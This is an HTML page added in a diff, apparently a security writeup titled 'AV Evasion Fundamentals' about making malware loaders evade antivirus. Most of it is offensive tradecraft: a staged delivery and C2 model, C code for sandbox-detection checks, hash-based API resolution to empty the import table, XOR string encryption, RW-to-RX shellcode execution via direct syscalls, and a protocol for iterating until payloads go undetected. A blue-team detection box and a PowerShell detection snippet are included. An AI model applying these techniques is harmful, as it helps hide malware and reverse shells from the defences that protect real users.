@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AV Evasion Fundamentals | 22nd Survey Division</title>
+    <meta name="description" content="Why behavioral AV (Kaspersky, CrowdStrike) differs from AMSI-based Defender. Sandbox detection, FUD loader concepts, memory-only execution, minimal payload design.">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --bg: #0a0a0a;
+            --bg2: rgba(18, 18, 18, 0.95);
+            --text: #ffffff;
+            --dim: #888888;
+            --border: rgba(255, 255, 255, 0.12);
+        }
+        body {
+            font-family: 'JetBrains Mono', monospace;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.7;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 4rem 2rem;
+        }
+        @media (max-width: 768px) {
+            .container { padding: 2rem 1rem; }
+        }
+        .back-link {
+            display: inline-block;
+            color: var(--dim);
+            font-size: 0.75rem;
+            margin-bottom: 2rem;
+            text-decoration: none;
+        }
+        .back-link:hover { color: var(--text); }
+        .tag {
+            display: inline-block;
+            font-size: 0.65rem;
+            color: var(--dim);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 0.5rem;
+        }
+        h1 {
+            font-size: 1.5rem;
+            font-weight: 400;
+            margin-bottom: 1rem;
+        }
+        .meta {
+            font-size: 0.75rem;
+            color: var(--dim);
+            margin-bottom: 2rem;
+            padding-bottom: 2rem;
+            border-bottom: 1px solid var(--border);
+        }
+        h2 {
+            font-size: 1rem;
+            font-weight: 500;
+            margin: 2rem 0 1rem;
+            color: var(--text);
+        }
+        p {
+            font-size: 0.85rem;
+            color: var(--dim);
+            margin-bottom: 1rem;
+        }
+        ul, ol {
+            font-size: 0.85rem;
+            color: var(--dim);
+            margin-bottom: 1rem;
+            padding-left: 1.5rem;
+        }
+        li { margin-bottom: 0.5rem; }
+        code {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 0.15rem 0.4rem;
+            font-size: 0.8rem;
+            border-radius: 2px;
+        }
+        .highlight {
+            color: var(--text);
+            font-weight: 500;
+        }
+        .layer-box {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border);
+            padding: 1.25rem;
+            margin-bottom: 0.75rem;
+        }
+        .layer-box h3 {
+            font-size: 0.78rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 0.5rem;
+            color: var(--text);
+        }
+        .layer-box p {
+            font-size: 0.78rem;
+            margin-bottom: 0;
+        }
+        .av-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.78rem;
+            margin-bottom: 1.5rem;
+        }
+        .av-table th {
+            text-align: left;
+            color: var(--text);
+            padding: 0.5rem 1rem;
+            border-bottom: 1px solid var(--border);
+            font-weight: 500;
+        }
+        .av-table td {
+            color: var(--dim);
+            padding: 0.5rem 1rem;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+        .detection-box {
+            background: rgba(255, 255, 255, 0.03);
+            border-left: 2px solid var(--dim);
+            padding: 1rem;
+            margin: 1.5rem 0;
+        }
+        .detection-box h3 {
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 0.5rem;
+            color: var(--text);
+        }
+        .mitre {
+            font-size: 0.75rem;
+            color: var(--dim);
+            margin-top: 2rem;
+            padding-top: 1rem;
+            border-top: 1px solid var(--border);
+        }
+        .layman-box { background: rgba(255,255,255,0.03); border-left: 3px solid rgba(255,255,255,0.2); padding: 1rem 1.25rem; margin: 1.5rem 0; }
+        .layman-label { font-size: 0.6rem; color: var(--dim); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 0.4rem; }
+        .layman-tldr { font-size: 0.85rem; color: var(--text); font-weight: 500; margin-bottom: 0.4rem; }
+        .layman-box p { font-size: 0.82rem; color: var(--dim); margin: 0; }
+        .detect-widget { background: #0d1117; border: 1px solid rgba(255,255,255,0.08); margin: 1.5rem 0; overflow: hidden; }
+        .dw-header { background: rgba(255,255,255,0.04); border-bottom: 1px solid rgba(255,255,255,0.06); padding: 0.4rem 0.75rem; display: flex; align-items: center; gap: 0.5rem; flex-wrap: wrap; }
+        .dw-dots { display: flex; gap: 4px; flex-shrink: 0; }
+        .dw-dot { width: 7px; height: 7px; border-radius: 50%; }
+        .dw-dot.r { background: #ff5f56; } .dw-dot.y { background: #ffbd2e; } .dw-dot.g { background: #27c93f; }
+        .dw-title { font-size: 0.6rem; color: #6a737d; flex: 1; margin-left: 4px; min-width: 100px; }
+        .dw-btref { font-size: 0.55rem; color: var(--dim); text-decoration: none; padding: 0.15rem 0.5rem; border: 1px solid var(--border); white-space: nowrap; }
+        .dw-btref:hover { color: var(--text); border-color: rgba(255,255,255,0.3); }
+        .dw-actions { display: flex; gap: 0.4rem; align-items: center; margin-left: auto; flex-shrink: 0; }
+        .detect-widget pre { font-size: 0.72rem; line-height: 1.6; padding: 0.75rem 1rem; margin: 0; color: #c9d1d9; overflow-x: auto; }
+        .dw-flag { border-top: 1px solid rgba(255,255,255,0.06); padding: 0.5rem 1rem; font-size: 0.65rem; color: var(--dim); }
+        .dw-flag strong { color: var(--text); }
+        .dw-copy { font-size: 0.55rem; color: var(--dim); background: transparent; border: 1px solid var(--border); padding: 0.15rem 0.4rem; cursor: pointer; white-space: nowrap; }
+        .dw-copy:hover { color: var(--text); border-color: rgba(255,255,255,0.3); }
+        .dw-copy.copied { color: #27c93f; border-color: #00ff88; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="/writeups/" class="back-link">&larr; Back to writeups</a>
+
+        <span class="tag">Evasion</span>
+        <h1>AV Evasion Fundamentals</h1>
+        <p class="meta">Why behavioral AV is fundamentally different from AMSI — and what that means for loader design</p>
+
+        <div class="layman-box">
+            <div class="layman-label">// What is this?</div>
+            <div class="layman-tldr">How malware hides from antivirus — and why scanning for files is a losing game.</div>
+            <p>Traditional AV fingerprints known malware (like a most-wanted list). Attackers bypass it by encrypting or rewriting their payload so the signature doesn't match. Behavioral AV watches what programs *do* — create processes, inject into other processes, reach out to the internet. Fooling behavioral detection means avoiding suspicious actions entirely, which forces attackers to be more surgical. Understanding both sides helps defenders tune detection without drowning in false positives.</p>
+        </div>
+
+        <div class="detect-widget">
+            <div class="dw-header">
+                <div class="dw-dots"><span class="dw-dot r"></span><span class="dw-dot y"></span><span class="dw-dot g"></span></div>
+                <span class="dw-title">PowerShell — AV Evasion Detection</span>
+                <div class="dw-actions">
+                    <a href="/blueteam-ref.html#evasion" class="dw-btref">&rarr; Blue Team</a>
+                    <button class="dw-copy" onclick="copyDetectWidget(this)" title="Copy to clipboard">Copy</button>
+                </div>
+            </div>
+            <pre># Check AMSI bypass
+try {
+  [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").GetValue($null)
+} catch { "AMSI check failed - may be tampered" }
+
+# Defender exclusions (attacker added)
+Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
+Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess
+
+# PowerShell execution policy bypass indicators
+Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-PowerShell/Operational"; Id=4104} -MaxEvents 200 -ErrorAction SilentlyContinue |
+  Where-Object { $_.Message -match "bypass|hidden|-enc|FromBase64" }</pre>
+            <div class="dw-flag"><strong>If this flags:</strong> AMSI returning True for amsiInitFailed = bypassed. Any user folder in Defender exclusions is suspicious. Encoded PowerShell is evasion.</div>
+        </div>
+
+
+        <p>Most bypass tutorials target Windows Defender's AMSI hook. That works against Defender. Against behavioral AV engines (Kaspersky, CrowdStrike, SentinelOne), AMSI patching is irrelevant — these products run kernel-mode drivers that see syscalls directly, not managed .NET buffers. Understanding the difference changes every design decision.</p>
+
+        <h2>Two Different Threat Models</h2>
+        <table class="av-table">
+            <tr><th>AV</th><th>Detection Method</th><th>Bypass Approach</th></tr>
+            <tr><td>Windows Defender</td><td>AMSI + ETW + Signatures</td><td>Patch AMSI/ETW, encrypt strings, obfuscate signatures</td></tr>
+            <tr><td>Kaspersky KIS</td><td>Kernel drivers + Behavioral + Cloud</td><td>Minimal behavior, unknown signature, no file operations</td></tr>
+            <tr><td>CrowdStrike Falcon</td><td>Behavioral AI + Process graph</td><td>Legitimate parent chain, avoid high-risk APIs in sequence</td></tr>
+            <tr><td>SentinelOne</td><td>Story-based detection + Kernel hooks</td><td>Break the story (unpredictable execution flow)</td></tr>
+        </table>
+
+        <p>Kaspersky's kernel drivers (<code>klif.sys</code> file filter, <code>klhk.sys</code> syscall hooks, <code>klids.sys</code> intrusion detection, <code>klwtp.sys</code> web traffic) sit below the Windows subsystem. They see everything before user-mode AV hooks can be patched. <span class="highlight">Patching AMSI/ETW against KAV accomplishes nothing.</span></p>
+
+        <h2>What Actually Triggers Behavioral Detection</h2>
+        <table class="av-table">
+            <tr><th>Behavior</th><th>Why It Triggers</th></tr>
+            <tr><td>Reading browser <code>Login Data</code> SQLite</td><td>Known credential theft path</td></tr>
+            <tr><td>Reading wallet paths (<code>%AppData%\Exodus\*</code>)</td><td>Known stealer behavior</td></tr>
+            <tr><td><code>VirtualAlloc</code> + <code>VirtualProtect</code> RWX</td><td>Shellcode injection signature</td></tr>
+            <tr><td>Connecting to unknown IP on port 4444/443/80</td><td>C2 beacon heuristic</td></tr>
+            <tr><td>Registry Run key writes</td><td>Persistence pattern</td></tr>
+            <tr><td>Process hollowing (suspend + unmap + map)</td><td>Behavioral signature</td></tr>
+            <tr><td>Reading LSASS memory</td><td>Credential dumping</td></tr>
+        </table>
+
+        <p>A minimal reverse shell — connect, receive, execute, send — often evades behavioral engines because it matches zero of these patterns. Feature creep (adding a stealer, adding a keylogger) is what introduces detection surface. <span class="highlight">Capability and detectability scale together.</span></p>
+
+        <h2>The Layered Evasion Model</h2>
+
+        <div class="layer-box">
+            <h3>Layer 0 — Delivery</h3>
+            <p>Initial access vector. LNK with RTL filename spoof, macro-enabled document, DLL side-loading into signed binary, USB drop. The delivery mechanism determines the first detection surface. Signed binaries loading side-loaded DLLs create a trusted parent process.</p>
+        </div>
+
+        <div class="layer-box">
+            <h3>Layer 1 — Sandbox Detection</h3>
+            <p>Before any payload logic runs, detect automated analysis environments and exit cleanly. AV vendors submit suspicious files to sandboxes with limited resources, time acceleration, and no user interaction. Each check targets a different sandbox limitation.</p>
+        </div>
+
+        <div class="layer-box">
+            <h3>Layer 2 — FUD Loader (Stage 1)</h3>
+            <p>The on-disk artifact must have zero readable strings, zero imports, and an unknown signature. PEB walking resolves Win32 APIs without an import table. XOR encryption hides string constants. Random variable names prevent signature matching on symbol patterns.</p>
+        </div>
+
+        <div class="layer-box">
+            <h3>Layer 3 — Memory-Only Execution (Stage 2)</h3>
+            <p>Stage 1 fetches encrypted Stage 2 shellcode from C2 over HTTPS. Decrypt in-memory to RW, then change to RX via direct syscall (<code>NtProtectVirtualMemory</code> via syscall stub, not <code>VirtualProtect</code>). Stage 2 never touches disk — file system filter drivers see nothing.</p>
+        </div>
+
+        <div class="layer-box">
+            <h3>Layer 4 — Minimal Payload</h3>
+            <p>Stage 2 does only what is needed: <code>WSAStartup</code> → socket → connect → recv/CreateProcess/send loop. No file operations. No registry. No browser DB access. No wallet reads. Behavioral engines track action sequences — a short sequence with no known-bad patterns clears behavioral thresholds.</p>
+        </div>
+
+        <h2>Sandbox Detection Checks</h2>
+        <p>These five checks run before any payload logic. All are read-only — they trigger no behavioral alerts. A sandbox hit causes silent exit (not crash, not error dialog — clean exit is less suspicious than abnormal termination).</p>
+
+        <div class="code-block" style="background:#0d1117;border:1px solid rgba(255,255,255,0.08);padding:1rem;margin:1rem 0;overflow-x:auto;">
+<pre style="font-size:0.78rem;line-height:1.6;margin:0;"><span style="color:#8b949e;">// 1. RAM check — sandboxes typically have < 4GB RAM</span>
+ULONGLONG mem;
+GetPhysicallyInstalledSystemMemory(&mem);
+<span style="color:#ff7b72;">if</span> (mem < (<span style="color:#79c0ff;">4</span> * <span style="color:#79c0ff;">1024</span> * <span style="color:#79c0ff;">1024</span>)) <span style="color:#ff7b72;">return</span> <span style="color:#79c0ff;">0</span>;  <span style="color:#8b949e;">// exit</span>
+
+<span style="color:#8b949e;">// 2. CPU count — sandboxes often use 1 CPU</span>
+SYSTEM_INFO si;
+GetSystemInfo(&si);
+<span style="color:#ff7b72;">if</span> (si.dwNumberOfProcessors < <span style="color:#79c0ff;">2</span>) <span style="color:#ff7b72;">return</span> <span style="color:#79c0ff;">0</span>;
+
+<span style="color:#8b949e;">// 3. VM process check — common virtualization artifacts</span>
+<span style="color:#8b949e;">// Check for: vmtoolsd.exe, VBoxService.exe, qemu-ga.exe</span>
+HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span style="color:#79c0ff;">0</span>);
+<span style="color:#8b949e;">// [walk process list, compare against known VM process names]</span>
+
+<span style="color:#8b949e;">// 4. Sleep acceleration — sandboxes compress time to speed analysis</span>
+DWORD t0 = GetTickCount();
+Sleep(<span style="color:#79c0ff;">3000</span>);
+DWORD elapsed = GetTickCount() - t0;
+<span style="color:#ff7b72;">if</span> (elapsed < <span style="color:#79c0ff;">2500</span>) <span style="color:#ff7b72;">return</span> <span style="color:#79c0ff;">0</span>;  <span style="color:#8b949e;">// sandbox compressed the sleep</span>
+
+<span style="color:#8b949e;">// 5. Mouse movement — sandboxes have no user interaction</span>
+POINT p1, p2;
+GetCursorPos(&p1);
+Sleep(<span style="color:#79c0ff;">5000</span>);
+GetCursorPos(&p2);
+<span style="color:#ff7b72;">if</span> (p1.x == p2.x && p1.y == p2.y) <span style="color:#ff7b72;">return</span> <span style="color:#79c0ff;">0</span>;  <span style="color:#8b949e;">// no mouse movement = no human</span></pre>
+        </div>
+
+        <h2>FUD Loader: Zero Imports via PEB Walking</h2>
+        <p>A standard PE binary lists its imported DLLs and functions in the Import Address Table. AV engines scan the import table for known-dangerous functions (<code>VirtualAlloc</code>, <code>CreateRemoteThread</code>, <code>WriteProcessMemory</code>). <span class="highlight">PEB walking resolves these APIs at runtime without any import table entry.</span></p>
+
+        <p>The Process Environment Block (PEB) at <code>FS:[0x30]</code> / <code>GS:[0x60]</code> contains a linked list of loaded modules. Walking this list locates <code>kernel32.dll</code> by hash, then walks its export directory to find <code>LoadLibraryA</code> and <code>GetProcAddress</code> — without importing either.</p>
+
+        <div class="code-block" style="background:#0d1117;border:1px solid rgba(255,255,255,0.08);padding:1rem;margin:1rem 0;overflow-x:auto;">
+<pre style="font-size:0.78rem;line-height:1.6;margin:0;"><span style="color:#8b949e;">// djb2 hash — deterministic API resolution without strings</span>
+<span style="color:#ff7b72;">static</span> DWORD <span style="color:#d2a8ff;">hash_name</span>(<span style="color:#ff7b72;">const</span> <span style="color:#ff7b72;">char</span>* s) {
+    DWORD h = <span style="color:#79c0ff;">5381</span>;
+    <span style="color:#ff7b72;">while</span> (*s) h = ((h << <span style="color:#79c0ff;">5</span>) + h) + *s++;
+    <span style="color:#ff7b72;">return</span> h;
+}
+
+<span style="color:#8b949e;">// Walk PEB to find kernel32.dll (no LoadLibrary needed)</span>
+<span style="color:#8b949e;">// 1. TIB → PEB via FS/GS segment register</span>
+<span style="color:#8b949e;">// 2. PEB → PEB_LDR_DATA → InMemoryOrderModuleList</span>
+<span style="color:#8b949e;">// 3. Walk list, compare module name hash against hash("KERNEL32.DLL")</span>
+<span style="color:#8b949e;">// 4. Found → walk export directory for desired function hashes</span>
+
+<span style="color:#8b949e;">// Result: call any Win32 API with zero import table entries</span>
+<span style="color:#8b949e;">// objdump -p loader.dll | grep "DLL Name" → empty output</span></pre>
+        </div>
+
+        <h2>String Encryption (XOR)</h2>
+        <p>Strings in an executable are readable by any scanner that runs <code>strings(1)</code> on the binary. All string constants — DLL names, API names, hardcoded paths — are encrypted at build time with a random XOR key. The key is embedded, but because each build uses a different key, there is no signature to match.</p>
+
+        <div class="code-block" style="background:#0d1117;border:1px solid rgba(255,255,255,0.08);padding:1rem;margin:1rem 0;overflow-x:auto;">
+<pre style="font-size:0.78rem;line-height:1.6;margin:0;"><span style="color:#8b949e;">// BAD — string visible in binary, matchable by scanner</span>
+LoadLibraryA(<span style="color:#a5d6ff;">"amsi.dll"</span>);
+
+<span style="color:#8b949e;">// GOOD — encrypted at compile time, decrypted in-place</span>
+<span style="color:#8b949e;">// "ntdll.dll" XOR 0x4B = {0x27,0x2F,0x29,0x25,0x65,0x27,0x25,0x25}</span>
+<span style="color:#ff7b72;">unsigned char</span> s1[] = {<span style="color:#79c0ff;">0x27</span>,<span style="color:#79c0ff;">0x2F</span>,<span style="color:#79c0ff;">0x29</span>,<span style="color:#79c0ff;">0x25</span>,<span style="color:#79c0ff;">0x65</span>,<span style="color:#79c0ff;">0x27</span>,<span style="color:#79c0ff;">0x25</span>,<span style="color:#79c0ff;">0x25</span>,<span style="color:#79c0ff;">0x00</span>};
+<span style="color:#ff7b72;">char</span> t[16];
+<span style="color:#ff7b72;">for</span> (<span style="color:#ff7b72;">int</span> i = <span style="color:#79c0ff;">0</span>; i < <span style="color:#79c0ff;">8</span>; i++) t[i] = s1[i] ^ <span style="color:#79c0ff;">0x4B</span>;
+t[<span style="color:#79c0ff;">8</span>] = <span style="color:#79c0ff;">0</span>;
+<span style="color:#8b949e;">// Use t ("ntdll.dll"), then zero it</span>
+memset(t, <span style="color:#79c0ff;">0</span>, <span style="color:#ff7b72;">sizeof</span>(t));  <span style="color:#8b949e;">// remove from memory post-use</span></pre>
+        </div>
+
+        <p>A build script generates a new random key per compile, encrypts every string constant into a header file, and produces a binary with no recognizable strings. The same binary never produces the same signature twice.</p>
+
+        <h2>Memory-Only Execution: RW → RX Transition</h2>
+        <p>The standard shellcode injection pattern (<code>VirtualAlloc(RWX)</code>) is a known behavioral trigger — allocating memory that is simultaneously writable and executable is an immediate flag. The correct approach separates write and execute phases:</p>
+
+        <ol>
+            <li>Allocate RW memory (<code>PAGE_READWRITE</code>) — not executable, benign</li>
+            <li>Write decrypted shellcode into the RW buffer</li>
+            <li>Change protection to RX (<code>PAGE_EXECUTE_READ</code>) via direct syscall</li>
+            <li>Execute — memory was never RWX simultaneously</li>
+        </ol>
+
+        <p>Using a direct syscall stub for <code>NtProtectVirtualMemory</code> (rather than calling <code>VirtualProtect</code> from <code>kernel32.dll</code>) avoids the userland hook that behavioral engines place on that function. The syscall number is resolved dynamically from the NTDLL export table at runtime.</p>
+
+        <h2>Testing Protocol</h2>
+        <p>The correct testing order validates functionality before adding evasion complexity. Diagnosing an evasion failure in untested code is significantly harder.</p>
+
+        <ol>
+            <li><span class="highlight">No AV:</span> Disable all AV. Verify the tool connects, commands execute, output returns. If broken here, it's a code bug, not an evasion gap.</li>
+            <li><span class="highlight">Defender only:</span> Enable Defender RTP. If detected, identify which layer triggers — file scan (signature), memory scan (AMSI), or behavioral (ETW). Fix that layer.</li>
+            <li><span class="highlight">Behavioral AV:</span> Full AV with behavioral detection enabled. Monitor what triggers — if detected, analyze whether it's signature (rebuild), behavioral (reduce payload actions), or network heuristic (change protocol).</li>
+            <li><span class="highlight">Iterate:</span> Each detection event is diagnostic data. Signature match → change byte patterns. Behavioral hit → remove or delay the triggering action. Heuristic → change execution flow.</li>
+        </ol>
+
+        <h2>The Minimal Payload Principle</h2>
+        <p>The most evaded payload in any test is often the simplest: connect socket, receive command, spawn <code>cmd.exe</code> with redirected stdio, send output, loop. It does nothing detectable because it does almost nothing at all. Feature additions (persistence, credential theft, lateral movement) each introduce new behavioral signals.</p>
+
+        <p>This is why capability separation matters architecturally: run a minimal persistent shell first, then send dedicated modules for each additional capability. A credential harvester that runs once and exits creates a shorter detection window than a persistent beacon that harvests on every connection.</p>
+
+        <div class="detection-box">
+            <h3>Detection — Blue Team</h3>
+            <p><span class="highlight">Import table anomaly:</span> PE files with empty or minimal import tables are statistically rare. A DLL with zero imports should be inspected — it's either a rare legitimate use case or a loader using PEB walking.</p>
+            <p><span class="highlight">RW→RX transition:</span> <code>NtProtectVirtualMemory</code> calls that change a previously-written region from non-executable to executable. Sysmon Event ID 8 (CreateRemoteThread) and ETW memory protection change events.</p>
+            <p><span class="highlight">Syscall anomaly:</span> Direct syscalls that bypass <code>ntdll.dll</code> (syscall instruction not preceded by expected <code>ntdll</code> address range). EDR kernel callbacks still fire, but the userland hook is bypassed.</p>
+            <p><span class="highlight">Sandbox evasion IOC:</span> Processes that call <code>GetPhysicallyInstalledSystemMemory</code>, <code>GetSystemInfo</code>, <code>CreateToolhelp32Snapshot</code>, <code>GetCursorPos</code> in sequence before any network activity are exhibiting sandbox fingerprinting behavior.</p>
+            <p><span class="highlight">Process lineage:</span> A process with a legitimate parent (signed binary) spawning a network connection followed by <code>cmd.exe</code> — the parent has no business creating network connections and shells.</p>
+        </div>
+
+        <h2>Summary: Reducing Detection Surface</h2>
+        <ul>
+            <li>Know which detection layer you're targeting — AMSI bypass is irrelevant against kernel-mode behavioral AV</li>
+            <li>Zero imports via PEB walking eliminates import table scanning</li>
+            <li>Random XOR key per build eliminates static signature matching</li>
+            <li>RW → RX (not RWX) reduces memory injection signatures</li>
+            <li>Sandbox detection gates payload execution to real hardware</li>
+            <li>Minimal payload minimizes behavioral detection surface</li>
+            <li>Stage 2 never touches disk — file system filter drivers see nothing</li>
+        </ul>
+
+        <h2>Demo</h2>
+        <p>Loader execution against active AV — payload delivery using the techniques described above.</p>
+        <div style="background:#0d1117;border:1px solid rgba(255,255,255,0.08);margin:1rem 0;overflow:hidden;">
+            <video controls playsinline preload="none" style="width:100%;display:block;max-height:480px;">
+                <source src="/videos/fuillchiw.MP4" type="video/mp4">
+                Your browser does not support video playback.
+            </video>
+        </div>
+
+        <p class="mitre">MITRE ATT&CK: T1055 (Process Injection) · T1027 (Obfuscated Files or Information) · T1497 (Virtualization/Sandbox Evasion) · T1620 (Reflective Code Loading)</p>
+    </div>
+
+<script>
+function copyDetectWidget(btn) {
+    const pre = btn.closest('.detect-widget').querySelector('pre');
+    // Use textContent and normalize line endings for mobile compatibility
+    const text = pre.textContent.replace(/\r\n/g, '\n').trim();
+    navigator.clipboard.writeText(text).then(() => {
+        btn.textContent = 'Copied!';
+        btn.classList.add('copied');
+        setTimeout(() => {
+            btn.textContent = 'Copy';
+            btn.classList.remove('copied');
+        }, 2000);
+    });
+}
+</script>
+    <!-- ElevenLabs Voice Widget -->
+    <elevenlabs-convai agent-id="agent_1901m3ndae6tecqa74rbmz86n7j3"></elevenlabs-convai>
+    <script src="https://unpkg.com/@elevenlabs/convai-widget-embed" async type="text/javascript"></script>
+</body>
+</html>
